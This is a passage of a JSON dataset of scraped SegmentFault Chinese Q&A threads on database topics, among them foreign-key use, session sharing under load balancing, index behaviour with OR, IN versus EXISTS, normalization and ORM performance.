      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000401508\">\n<p><a href=\"http://tangzhongxin.blog.163.com/blog/static/89219612011929104914408/\" rel=\"nofollow\">找到了这篇数据库外键的必要性</a><br>\n数据库外键的必要性，扯蛋！这个时候还来讨论这个问题，就像讨论“我们是否需要穿上衣服上街，还是要大家都在街上祼奔一样”。</br></p>\n<h1>从各主要数据库发展趋势</h1>\n<p>可以看出，大数据库像Orcle，MS SQL Server，……就不说了，它们一直都是。</p>\n<p>你说 MySql 不支持，那是 MyISAM 表格式，现在它们默认都是 InnoDB 表格式，它是支持外键的；</p>\n<p>你说 SQLite不支持，但它从 3.6.19 版本开始已支持了……</p>\n<p>……</p>\n<p>…… 只是你的懒惰和习惯而已！！！ ……</p>\n<h1>大家喜欢使用外键吗？</h1>\n<p><a href=\"http://www.itpub.net/thread-1313696-1-1.html\" rel=\"nofollow\">http://www.itpub.net/thread-1313696-1-1.html</a></p>\n<h3>正方：代表人物newkid。</h3>\n<p>主要论点如下</p>\n<p>原帖由 newkid 于 2010-6-10 22:48 发表<br>\n记得我不止一次在这里和别人争过这个问题了。<br>\n1. <strong>你的程序再严谨也有可能出现BUG</strong>;你自己判断不如交给数据库判断，它做得又快又好。<br>\n    大多数人的程序没有考虑并发问题。一旦考虑了就得手工加锁，效率很低。<br>\n    数据可能绕过你的应用程序进入数据库。<br>\n2. <strong>性能</strong>问题：难道你自己做就没有开销？<br>\n    一个外键判断分摊到事务级别，开销可以忽略，用户完全没有察觉。<br>\n    如果是批量导入数据，可以先暂时屏蔽外键，事后用NOVALIDATE选项快速恢复，前提是你的数据是干净的。<br>\n3. 举个麻烦的例子看看？<br>\n    外键约束正是为了防止你乱来，这是给你的保护。<br>\n    开车系安全带麻烦吧？有时候它能救你的命。<br>\n4. nyfor说过了可以用延迟约束。但根据我的经验没什么必要。凡是有外键则父亲数据必定先生成。比方说你的入库单，入库明细需要这个单号，那么父亲表（入库单）肯定要先生成。<br>\n此外，外键还会给CBO提供重要的信息，用来生成最优计划。</br></br></br></br></br></br></br></br></br></br></br></br></p>\n<h3>反方：代表人物qingyun。</h3>\n<p>主要论点如下</p>\n<p>原帖由 qingyun 于 2010-6-10 13:32 发表<br>\n我不太喜欢外键，<br>\n原因：<br>\n   1.<strong>程序逻辑，完整性</strong>，我会在存储过程或包等地方做严谨的判断；<br>\n   2.<strong>性能</strong>问题，这是我最不喜欢用的关键原因，比如一个业务流水表，频繁插入数据，如果这个表身上有3外键，那么每次插入一条，就必须对这3个外键对应的3个表做相应的查找判断有无对应数据，如果这3个表也很大，那就这3个表的判断时间就很常，虽然外键指向的关联表的字段肯定是索引，但是我觉得很多时候，这样的判断本来就在程序里控制好了，通过外键再判断一次，就是降低性能；而且其实有的地方判不判断也无所谓的，但是用了外键，就必须化时间去判断，无论oracle内部多么优化外键对于数据的检索速度，它总是一个不小的消耗；<br>\n   3.<strong>维护麻烦</strong>，很多公司的软件都是定制的，这种定制的东西，随意性相对较大，项目开发实施过程中，需要经常对表修修补补；还有就是业务逻辑有bug或者其他情况，需要经常手工维护数据，有错综复杂的外键关联着，很是麻烦；<br>\n   4.<strong>不灵活</strong>,外键定死了两个表之间数据的先后生成关系，最常见的是单据主从表，有的时候，在生成单据的时候，是先生成明细，再生成主表；如果钉死了外键，这个就没法实现；<br>\n  当然有些关键的业务，确实需要外键；<br>\n为什么说这个话题，我今天把项目数据库建立好后，用了很少的外键，周围同事说数据不严谨，需要错综复杂的那些相同字段名的外键都建立起来，这个我很不情愿；<br>\n比如这个数据库一共100个表，按他们的想法，外键就可能有300个；我晕，太教条主义了；<br>\n如果说让我建300个索引，我很乐意，因为提高运作效率的，而外键只是检测严谨性，对数据库的运作效率只有降低，没有任何提高的可能性；<br>\n其实这只是设计习惯的问题 ，有兴趣大家随便聊聊自己的习惯。</br></br></br></br></br></br></br></br></br></br></br></p>\n<p>还有一个反方的声音有独特见解</p>\n<p>一起放上来供大家参考</p>\n<p>原帖由 ruideliang 于 2010-6-12 14:42 发表<br>\n外键是暴露的,程序是封闭的,同样是经过测试的程序和外键约束,人为因素造成约束失效的可能性谁大谁小,很明显,所以反对使用外键,因为与系统高可用性目的冲突</br></p>\n<p>反！</p>\n<p>外键是暴露的? 只要绕过你的应用程序登录数据库，还有什么不是暴露的？<br>\n那你说要不要主键？它也是暴露的，你随时可以DROP.<br>\n表结构呢？是不是暴露的？你随时可以修改。<br>\n这又和高可用性有什么关系？<br>\n“<strong>同样是经过测试的程序和外键约束</strong>”：<br>\n外键不用测试。只要你的数据存在这种关系，一个DDL搞定。<br>\n外键同样也可以是封闭的。有一种东西叫做“授权”，不该看到的用户，什么也看不到！在我设计的系统中，客户端只能看到存储过程的接口。</br></br></br></br></br></br></p>\n<h1>数据库中主键和外键的设计原则</h1>\n<p><a href=\"http://www.cnblogs.com/tianyamoon/archive/2008/04/02/1134394.html\" rel=\"nofollow\">http://www.cnblogs.com/tianyamoon/archive/2008/04/02/1134394.html</a></p>\n<p>主键和外键是把多个表组织为一个有效的关系数据库的粘合剂。主键和外键的设计对物理数据库的性能和可用性都有着决定性的影响。</p>\n<p>必须将数据库模式从理论上的逻辑设计转换为实际的物理设计。而主键和外键的结构是这个设计过程的症结所在。一旦将所设计的数据库用于了生产环境，就很难对这些键进行修改，所以在开发阶段就设计好主键和外键就是非常必要和值得的。</p>\n<p>主键：</p>\n<p>关系数据库依赖于主键---它是数据库物理模式的基石。主键在物理层面上只有两个用途：</p>\n<blockquote>\n<ol>\n<li><strong>惟一地标识一行。</strong></li>\n<li>\n<strong>作为一个可以被外键有效引用的对象</strong>。</li>\n</ol>\n</blockquote>\n<p>基于以上这两个用途，下面给出了我在设计物理层面的主键时所遵循的一些原则：</p>\n<blockquote>\n<ol>\n<li>主键应当是对用户没有意义的。如果用户看到了一个表示多对多关系的连接表中的数据，并抱怨它没有什么用处，那就证明它的主键设计地很好。</li>\n<li>主键应该是单列的，以便提高连接和筛选操作的效率。<br>\n  注：使用复合键的人通常有两个理由为自己开脱，而这两个理由都是错误的。其一是主键应当具有实际意义，然而，让主键具有意义只不过是给人为地破坏数据库提供了方便。其二是利用这种方法可以在描述多对多关系的连接表中使用两个外部键来作为主键，我也反对这种做法，理由是：复合主键常常导致不良的外键，即当连接表成为另一个从表的主表，而依据上面的第二种方法成为这个表主键的一部分，然，这个表又有可能再成为其它从表的主表，其主键又有可能成了其它从表主键的一部分，如此传递下去，越靠后的从表，其主键将会包含越多的列了。</br></li>\n<li>永远也不要更新主键。实际上，因为主键除了惟一地标识一行之外，再没有其他的用途了，所以也就没有理由去对它更新。如果主键需要更新，则说明主键应对用户无意义的原则被违反了。<br>\n  注：这项原则对于那些经常需要在数据转换或多数据库合并时进行数据整理的数据并不适用。</br></li>\n<li>主键不应包含动态变化的数据，如时间戳、创建时间列、修改时间列等。</li>\n<li>主键应当有计算机自动生成。如果由人来对主键的创建进行干预，就会使它带有除了惟一标识一行以外的意义。一旦越过这个界限，就可能产生认为修改主键的动机，这样，这种系统用来链接记录行、管理记录行的关键手段就会落入不了解数据库设计的人的手中。</li>\n</ol>\n</blockquote>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000401455\">\n<p>RT<br>\n拿掉外键好像是，能增加效率减少约束。</br></p>\n</div>",
      "favourite": "13",
      "glance": "8.6k",
      "tags": [
        "mysql",
        "sql",
        "数据库",
        "数据库设计",
        "数据库性能优化"
      ],
      "time": "2014-01-30",
      "title": "MySQL数据库应不应该拿掉所有的外键约束？",
      "url": "https://segmentfault.com/q/1010000000401455"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000442620\">\n<p>cookie存一个key，具体信息存在数据库里，可以用memcache/redis这些基于内存的key-value存储来加速</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000442634\">\n<p><a href=\"http://segmentfault.com/u/socrates\">@socrates</a> 提供了一个方法，另外也可以通过对IP做hash把相同用户的请求发送到同一后端，nginx就有这种简单的会话保持功能。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000442765\">\n<p>几个思路：</p>\n<p>1 、负载算法采用 IP hash ，把每次相同 IP 的请求转发到同一台 Web 服务器上。<br>\n缺点是不能有效利用到所有的 Web 服务器来做均衡负载，一般负载算法都是 Round Robin 。</br></p>\n<p>2 、重写 session handler , 把 session 用数据库来存储。<br>\n缺点是访问量高的情况下，IO 吞吐太高的话会影响网站性能。</br></p>\n<p>3 、把 session 的默认存储路径设置为 NFS 上的一块存储区域，这样所有的 Web 服务器就可以共享了。<br>\n缺点是一旦 NFS 挂了，session 就再也没有办法使用了。</br></p>\n<p>4 、最简单的，把 php.ini 里的 session save handler 设置为 memcache 或者 redis。<br>\n推荐用 memcache 。如果用 redis 的话，目前没有好用的 cluster 解决方案，而来 redis 还会把数据回写到硬盘上，完全没必要。而 memcache 只需要很少的配置就能做 cluster ，数据操作完全在内存里，速度杠杠滴。</br></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000442612\">\n<p>对应用服务器做了负载均衡之后如何保持session等记录用户登录状态的会话信息？用cookie？但是这样觉得不太安全。</p>\n</div>",
      "favourite": "7",
      "glance": "6.4k",
      "tags": [
        "架构",
        "phpredis",
        "php",
        "java",
        "数据库"
      ],
      "time": "2014-03-22",
      "title": "对应用服务器做了负载均衡之后如何保持session等记录用户登录状态的会话信息？",
      "url": "https://segmentfault.com/q/1010000000442612"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000486727\">\n<p>MySQL表中加一个字段并添加了Index索引，现在把字段删除后对该字段的索引是否还存在？若存在，后期要怎么删除该索引？</p>\n<p>附上执行的sql语句:</p>\n<pre><code class=\"lang-sql\">ALTER TABLE `mytab` ADD COLUMN `is_export`  enum('yes','no') CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'no' COMMENT '是否已经导出' AFTER `start_time`;\n\nCREATE INDEX `is_export` ON `mytab`(`is_export`) USING BTREE ;\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "2.7k",
      "tags": [
        "mysql",
        "数据库"
      ],
      "time": "2014-04-29",
      "title": "MySQL中删除带有索引的字段后，索引会自动删除么？",
      "url": "https://segmentfault.com/q/1010000000486727"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000513893\">\n<p>最近小弟在研究微软的PowerBI，有大神有什么学习资料推荐码？</p>\n</div>",
      "favourite": "0",
      "glance": "754",
      "tags": [
        "sql",
        "数据库"
      ],
      "time": "2014-05-20",
      "title": "有大神用过PowerBI吗？",
      "url": "https://segmentfault.com/q/1010000000513893"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000589933\">\n<p>没仔细看你提到的link, 是想说 因为用了or, 觉得mysql只能用一条索引, 所以就没法是用索引了?</p>\n<p>mysql的一条查询是可以使用多个索引的, 同样适用于or的情况, 详见:<br>\nIndex Merge Optimization<br><a href=\"http://dev.mysql.com/doc/refman/5.7/en/index-merge-optimization.html\" rel=\"nofollow\">http://dev.mysql.com/doc/refman/5.7/en/index-merge-optimization.html</a></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000594987\">\n<p>索引失效否和参与OR的条件的字段有没有索引以及索引类型相关</p>\n<p>假设两个条件 A1 &gt; 1 OR A2 &gt; 2</p>\n<ul>\n<li><p>如果A1或者A2其中之一没索引，那查询必然要遍历全表，有索引的字段便“索引失效”了。</p></li>\n<li><p>其次，即使它们都有索引，还得和索引的类别结合起来（这一条我在实际开发中并没在意，因为涉及的应用都较小且基本没用过OR语句）。如果索引不是簇集索引又是范围查询的话，有时候使用索引的效率还不如顺序扫描全表，这时候DBMS可能就放弃使用索引了。</p></li>\n</ul>\n<p>以上是这学期数据库课上讲到的（实际实现和理论可能有不小出入）</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000589584\">\n<p>大多数SQL数据库的索引都是B+Tree之类的数据结构，这个结构是“有序”的，比如一个integer字段上的索引会按照这个字段的值进行排序，这种索引的优点在于可以支持range query，比如<code>where f&gt;100</code>这样的条件可以充分有效的利用索引。<br>\n但是这种结构也会带来一个问题——不同的两个字段的索引的顺序并不相同，比如<code>where f1&gt;100 or f2&lt;50</code>这样的条件，你只能顺序扫描f1和f2的索引，这时你无法同时用两个索引判断一条记录是否满足条件，所以为了做这样的过滤，只能放弃其中一个索引，甚至做全表扫描。</br></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000589553\">\n<p>看到OSChina上的两篇文章<a href=\"http://www.oschina.net/question/12_70587\" rel=\"nofollow\">《OSChina 用户动态设计说明》</a>和<a href=\"http://www.oschina.net/question/12_70252\" rel=\"nofollow\">《OSChina 的留言表设计说明》</a>中都提到，如果在SQL语句的查询条件中使用OR的话，会消除SQL优化的效果，索引在这里也会失去作用。</p>\n<p>不明觉厉，求高手指点。</p>\n</div>",
      "favourite": "5",
      "glance": "4.2k",
      "tags": [
        "数据库",
        "sql"
      ],
      "time": "2014-06-26",
      "title": "SQL语句里使用OR关键字会使索引失效吗",
      "url": "https://segmentfault.com/q/1010000000589553"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000638419\">\n<p>看mgo文档会有一个canonical mode，但是不是很明白这个mode设置了是干什么，后来又看到一个canonical pointer，在别的讲内存的文章里面，这个canonical 指的是什么意思？</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "编程",
        "指针",
        "数据库"
      ],
      "time": "2014-08-17",
      "title": "一般文章当中的canonical 指的是什么意思？",
      "url": "https://segmentfault.com/q/1010000000638419"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000650598\">\n<p>以mysql为例，数据库可以处理一些比较复杂的事情，例如排序、各种数学运算，但是在web系统中数据库有经常会成为系能的瓶颈，但是如果将那些排序、运算等操作交给代码逻辑的话又会造成代码的增加。。。。。想问问各位通常是怎么处理？依据是什么？</p>\n</div>",
      "favourite": "1",
      "glance": "916",
      "tags": [
        "php",
        "性能调优",
        "数据库"
      ],
      "time": "2014-08-27",
      "title": "把数据处理交给数据库还是代码逻辑",
      "url": "https://segmentfault.com/q/1010000000650598"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000672532\">\n<p>RT，不太理解这两者的的具体含义和不同在哪里，希望能类比举例说明白一些。</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "数据库"
      ],
      "time": "2014-09-17",
      "title": "标识关系和非标识关系的区别在哪里？",
      "url": "https://segmentfault.com/q/1010000000672532"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000683388\">\n<p>如题，类似微信这样的大量数据，像附近的人、摇一摇这样的功能，数据存储和查询在那么短时间内是怎么做到的？</p>\n</div>",
      "favourite": "11",
      "glance": "3.9k",
      "tags": [
        "数据查询",
        "数据库",
        "微信"
      ],
      "time": "2014-09-19",
      "title": "类似“附近的人”功能，大量数据如何存储和快速查询？",
      "url": "https://segmentfault.com/q/1010000000683388"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000685868\">\n<p>Core Data 里是否有一个默认的时间戳或 lastModified 属性供访问？如果有的话该如何访问呢？</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "ios",
        "ios-coredata",
        "数据库"
      ],
      "time": "2014-09-21",
      "title": "Core Data 里的默认时间戳属性问题",
      "url": "https://segmentfault.com/q/1010000000685868"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000725629\">\n<p>当你要删除某个大表数据的时候就知道了，各种限制，当然，如果你模型设计的很好，这些也可以避免<br>\n我现在负责的两个维护项目中，除了配置表，很少用外键去关联什么</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000725961\">\n<p>我在微软实习的时候，有同事写的外键引发了不少问题。然后我mentor如是说：“别加外键，在我看来，外键就是用来作图的。”</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000725423\">\n<p>看情景啦, 比如你有一个表存放产品数据, 另一个表存放产品类型, 这时候用外键也没啥<br>\n如果你有一个表存放订单数据, 另外一个表存放顾客信息, 还有存放产品信息的表以及存放店铺信息的表, 这时候用外键就会慢<br>\n我也不大懂哈, 看看下边吧, 需要的话替你翻译一下<br><a href=\"http://stackoverflow.com/questions/83147/whats-wrong-with-foreign-keys\" rel=\"nofollow\">http://stackoverflow.com/questions/83147/whats-wrong-with-foreign-keys</a></br></br></br></p>\n<p></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000724563\">\n<p>大家如何选择的平时<br>\n在外键与表链接之间</br></p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "php",
        "mysql",
        "数据库",
        "数据库设计",
        "数据库性能优化"
      ],
      "time": "2014-10-15",
      "title": "为什么要少用外键？外键与表链接的主要区别？",
      "url": "https://segmentfault.com/q/1010000000724563"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000844027\">\n<p>Memcached 是采用 LRU 算法来淘汰过期的缓存对象，而传统的 LRU 实现是采用双向链表+哈希表的形式，每次读写数据都会改变链表的状态，所以每次读写操作都要锁住这个 LRU 队列。这样在高并发场景下，加锁带来的开销应该会比较大，想知道 memcached 是如何应对的？</p>\n</div>",
      "favourite": "1",
      "glance": "1.6k",
      "tags": [
        "memcached",
        "数据库"
      ],
      "time": "2014-11-13",
      "title": "关于 Memcached 应对高并发的疑惑",
      "url": "https://segmentfault.com/q/1010000000844027"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002371952\">\n<p>肯定是cookie啊</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002372653\">\n<p>session也有可能</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002386780\">\n<html><body><p>不用说一定是session。<br>\n虽然session也不一定是完全的安全，但是cookie却是完全的不安全性。<br>\n以下就是京东存在cookie的session_id了，删除了购物车就空了。<br>\n其实，如果深究这个地方还有很多细节，足够开篇文章了。<br><img data-src=\"/img/bVka4m\"/></br></br></br></br></p></body></html>\n</div>",
      "attention": "13",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002361441\">\n<p>如题，当游客浏览的时候那些购物车里面的数据存到哪的？</p>\n</div>",
      "favourite": "1",
      "glance": "3.8k",
      "tags": [
        "php",
        "购物车",
        "cookie",
        "session",
        "数据库"
      ],
      "time": "2014-11-22",
      "title": "京东的购物车如何存的，游客的购物车存在哪里的？",
      "url": "https://segmentfault.com/q/1010000002361441"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002546504\">\n<p>脑图和 ER 图偏重于静态关系。如果你觉得不够，多半是希望有能表达动态过程的图表。UML 里面的活动图、状态图和序列图都可以用于表达动态过程。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002546958\">\n<p>如果梳理数据库关系的意思是描述数据结构和数据的关联性，那pdm就表示不服了。<br>\nUML更注重的是业务梳理</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002544691\">\n<p>UML好像也可以吧</p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002469877\">\n<p>除了脑图和ER图 还有哪些方式是大家常用来梳理数据库关系的工具</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "数据库"
      ],
      "time": "2015-01-07",
      "title": "除了脑图和ER图 还有哪些方式是大家常用来梳理数据库关系的工具",
      "url": "https://segmentfault.com/q/1010000002469877"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002501533\">\n<p>这个功能，对于@EZhang所说的，Inner表驱动Outer表，或者Outer驱动Inner表，我认为，在数据库层面上，它应该会进行SQL优化的。</p>\n<p>关于IN和EXISTS的主要区别在于三值逻辑的判断上。EXISTS总是返回TRUE或FALSE，而对于IN，除了TRUE、FALSE值外，还有可能对NULL值返回UNKNOWN。但是在过滤器中，UNKNOWN的处理方式与FALSE相同，因此使用IN与使用EXISTS一样，SQL优化器会选择相同的执行计划。</p>\n<p>说到了IN和EXISTS几乎是一样的，但是，就不得不说到NOT IN和NOT EXISTS，对于输入列表中包含NULL值时，NOT EXISTS和NOT IN之间的差异就表现的非常大了。输入列表包含NULL值时，IN总是返回TRUE和UNKNOWN，因此NOT IN就会得到NOT TRUE和NOT UNKNOWN，即FALSE和UNKNOWN。</p>\n<pre><code>mysql&gt; select 'c' NOT IN ('a', 'b', NULL)\\G;\n</code></pre>\n<p>执行一下上述代码，看看结果。你就会感到惊讶。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002494134\">\n<p>in 后面接一个列表，可以是直接的列表，例如 <code>in (1,2,3,4)</code>，也可以是通过查询出来的列表，例如 <code>in (select id from table where id &lt; 10)</code>。</p>\n<p>exists 后面接一个完整的查询语句，只要这个语句查询出来不为空，则该 exists 条件为 true。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002494017\">\n<p><a href=\"http://www.techrepublic.com/article/oracle-tip-understand-the-difference-between-in-and-exists-in-subqueries/\" rel=\"nofollow\">这里</a> 说 Oracle 中这两个的区别是:</p>\n<ul>\n<li>in: inner 表 驱动 outter 表.</li>\n<li>exists: outter 表 驱动 inner 表.</li>\n<li>inner 表查询得到的结果集小的时候使用 in, 否则使用 exists.</li>\n<li>小结果集驱动大结果集时查询效率更高.</li>\n</ul>\n<p>不知道楼下怎么看?</p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002493996\">\n<p>比如下面的两条语句，使用in关键字和exists关键字实现同样的功能，他们有什么区别？哪个更好一些？</p>\n<pre><code>select count(id) from t1 where f1 in (select f2 from t2);\n\nselect count(id) from t1 where exists (select * from t2 where f2 = t1.f1);\n</code></pre>\n</div>",
      "favourite": "3",
      "glance": "1.5k",
      "tags": [
        "数据库"
      ],
      "time": "2015-01-17",
      "title": "数据库：in和exists区别？",
      "url": "https://segmentfault.com/q/1010000002493996"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002569252\">\n<p>节省空间和增加查询效率之间,有时候是存在矛盾的.<br>\n很多时候都需要进行取舍.<br>\n其实这样的时候可以适当的反范式设计表.按照实际的需要适当增加一些重复的字段到一张表上是有好处的.<br>\n我有时会这样做.<br>\n但同时也有些问题,如果需求变了那就可能悲剧. 好的情况是这个冗余字段没用了.坏情况就是可能要修改表字段.<br>\n如果这时表已经积累非常多的数据,那就异常痛苦.<br>\n我一般倾向如果表列不是特别多的时候尽量增加些冗余吧!<br>\n也不用太纠结,实践证明除非数据一张表过了几千万,否则不会有太大的性能影响.<br>\n没必要想太多了. 真正需要优化的场景很少的.<br>\n数据库是要注重效率,但绝对没想象中那么脆弱.<br>\n一般慢的原因都是本身配置不合理,程序逻辑不合理,或者索引加的不合理引起的.真正什么高并发或者大量数据的情况真的很难遇到,你放心用就行了.</br></br></br></br></br></br></br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002569256\">\n<p>首先，一个设计良好的数据库，即使连接很多张表，查询效率也几乎不会下降。只不过开发起来有些麻烦，要不停的去联表或填充数据。</p>\n<p>如果不遵守第三范式，当数据经常更新的时候，就会很麻烦，要改很多地方。而不经常修改的表，比如报表和日志记录，字段很多，生成一次一般就不会再修改了，那么可以做数据冗余，满足第二范式即可。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002569236\">\n<p>来 <a href=\"http://xsk.tehon.org/den/index.php/category/tech/college-knowledge-database-principles.html\" rel=\"nofollow\">这里</a> 补补基础知识，认识一下三大范式和反范式，要基于实验的查询效率来做一个权衡。</p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002569161\">\n<p>==============<br>\n我先举个例子吧</br></p>\n<p>班级，课程，知识点 三张表</p>\n<p>课程和班级，一对多关系，一个课程下可能有多个班级，但是一个班级只能对应一个课程<br>\n课程和知识点，多对多，一个课程可以有多个知识点，一个知识点可以有多个课程</br></p>\n<p>这种情况该如何设计数据库，三张表加一张relation表，还是加两张relation表？</p>\n<p>============================</p>\n<p>关于问题</p>\n<p>1、不知道这么理解对不对，但在学习的过程中的确发现，按照三范式设计数据库，查询的时候会连接多张表达到查询目的。但我总觉得自己理解错了</p>\n<p>2、连接多张表一定是查询效率就下降了么</p>\n<p>4、设计时怎么权衡利弊，有无好的文章或blog私房货推荐阅读</p>\n</div>",
      "favourite": "0",
      "glance": "2k",
      "tags": [
        "数据库",
        "mysql"
      ],
      "time": "2015-02-28",
      "title": "设计数据库，满足第三范式就意味着在查询时连接更多表",
      "url": "https://segmentfault.com/q/1010000002569161"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002661719\">\n<pre><code>sql</code><code>DROP DATABASE IF EXISTS library; \n\nCREATE DATABASE library; \n\nUSE library; \n\nCREATE TABLE title \n  ( \n     callnumber VARCHAR(40) NOT NULL, \n     name       VARCHAR(200), \n     isbn       VARCHAR(40) NOT NULL, \n     year       DATE, \n     publisher  VARCHAR(80), \n     PRIMARY KEY (callnumber), \n     UNIQUE(isbn) \n  ); \n\nCREATE TABLE member \n  ( \n     memno          INT UNSIGNED NOT NULL, \n     driverlicstate VARCHAR(20), \n     driverlicno    VARCHAR(40), \n     fname          VARCHAR(20), \n     mi             VARCHAR(10), \n     lname          VARCHAR(20), \n     address        VARCHAR(250), \n     phonenumber    VARCHAR(15), \n     PRIMARY KEY (memno) \n  ); \n\nCREATE TABLE book \n  ( \n     book_id       INT UNSIGNED NOT NULL, \n     edition       VARCHAR(80), \n     borrowermemno INT UNSIGNED, \n     borrowduedate DATE, \n     callnumber    VARCHAR(40), \n     libcheck      INT UNSIGNED, \n     PRIMARY KEY (book_id), \n     FOREIGN KEY (callnumber) REFERENCES title(callnumber), \n     FOREIGN KEY (borrowermemno) REFERENCES member(memno), \n     FOREIGN KEY (libcheck) REFERENCES librarian(ssn) \n  ); \n\nCREATE TABLE librarian \n  ( \n     ssn      INT UNSIGNED NOT NULL, \n     name     VARCHAR(80), \n     address  VARCHAR(250), \n     salary   NUMERIC(9, 2), \n     gender   CHAR(1), \n     birthday DATE, \n     superssn INT UNSIGNED, \n     section  INT UNSIGNED, \n     PRIMARY KEY (ssn) \n  ); \n</code></pre>\n<p>就是这段sql，在执行的时候Book表是不能被创建的，因为他引用了Librarian的字段做外键，可是Librarian还没有被创建。如果调换顺序的话还是有问题（会有Librarian也引用了book表某个字段作为外键这种情况）。请问这样的sql怎么能执行呢？？</p>\n</div>",
      "favourite": "0",
      "glance": "689",
      "tags": [
        "数据库",
        "sql",
        "mysql"
      ],
      "time": "2015-04-09",
      "title": "学校的数据库实验课，遇到一个不能执行的sql",
      "url": "https://segmentfault.com/q/1010000002661719"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002886578\">\n<p>为什么要设置主键，设计表的时候是否都要加上主键。</p>\n</div>",
      "favourite": "0",
      "glance": "983",
      "tags": [
        "数据库",
        "数据库设计"
      ],
      "time": "2015-06-08",
      "title": "数据库中设置主键的意义",
      "url": "https://segmentfault.com/q/1010000002886578"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002929802\">\n<p>最近我们也遇到了相同的问题，ORM性能确实比原生sql要低很多，ORM只适合，快速敏捷迭代开发.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002929833\">\n<p>ORM性能确实会降低一些，这样就要看怎么取舍了 —— 如果说是要迅速把网站搞起来能用，ORM可能会更快，特别是比如有zii之类的代码生成工具</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002930976\">\n<p>如果你有10个甚至5个小伙伴一起写SQL，今天这个人JOIN了3个表明天那个人写了子查询，后天另一个人批量update where条件拼错，然后平均每天都有3次因为字段名字写错导致的bug，你就知道ORM的宝贵了</p>\n</div>",
      "attention": "14",
